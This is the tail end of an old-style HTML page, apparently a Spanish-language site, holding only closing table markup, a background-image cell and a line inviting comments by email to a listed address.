      <p><br>
      </p>
    </td>
  </tr>
  <tr>
    <td width="110" background="Fondoa.jpg" height="57">&nbsp;</td>
    <td width="" height="57">
      <div align="right"><font size="-1"><b>Comentarios a : <a href="mailto:deadsector@raza-mexicana.org">deadsector@raza-mexicana.org</a></b></font></div>
    </td>
  </tr>
</table>
</body>
</html>